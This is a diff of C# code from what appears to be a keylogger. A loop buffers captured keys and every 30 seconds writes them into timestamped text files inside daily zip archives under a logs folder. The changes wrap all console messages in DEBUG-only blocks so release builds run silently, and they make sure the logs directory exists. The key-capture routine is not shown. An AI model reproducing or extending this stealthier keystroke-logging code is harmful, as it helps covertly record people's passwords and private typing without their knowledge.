@@ -40,11 +40,15 @@ namespace Foo
     {
       if (keys_buffer.Count() == 0)
       {
+#if DEBUG
         Console.WriteLine("Нечего сохранять");
+#endif
         return;
       }
 
+#if DEBUG
       Console.WriteLine("Сохранение в {0} ...", filename);
+#endif
 
       File.AppendAllText(filename, keys_buffer);
 
@@ -55,12 +59,16 @@ namespace Foo
     {
       if (keys_buffer.Count() == 0)
       {
+#if DEBUG
         Console.WriteLine("Нечего сохранять. {0}", text_filename);
+#endif
         return;
       }
 
+#if DEBUG
       Console.WriteLine("Добавление файла {0} в архив {1} ...",
         text_filename, archive_filename);
+#endif
 
       byte[] keys_bytes = Encoding.UTF8.GetBytes(keys_buffer);
 
@@ -305,6 +313,13 @@ namespace Foo
       }
 #endif
 
+      const string logs_dir = "logs/";
+
+      if (!Directory.Exists(logs_dir))
+      {
+        Directory.CreateDirectory(logs_dir);
+      }
+
       const int sleep_ms = 0;
       const long TICKS_PER_SECOND = TimeSpan.TicksPerSecond;
       const int max_buffer_count = 4096 - 14;
@@ -312,7 +327,9 @@ namespace Foo
       while (true)
       {
         long last_save_tick = DateTime.Now.Ticks;
+#if DEBUG
         Console.WriteLine("last_save_tick = {0}", last_save_tick);
+#endif
 
         do
         {
@@ -321,7 +338,7 @@ namespace Foo
         } while (keys_buffer.Count() < max_buffer_count
           && DateTime.Now.Ticks - last_save_tick < TICKS_PER_SECOND * 30);
 
-        SaveToZip("logs/" + DateTime.Now.ToString("yyyy_MM_dd") + ".zip",
+        SaveToZip(logs_dir + DateTime.Now.ToString("yyyy_MM_dd") + ".zip",
           DateTime.Now.ToString("hh_mm_ss") + ".txt");
       }
     }
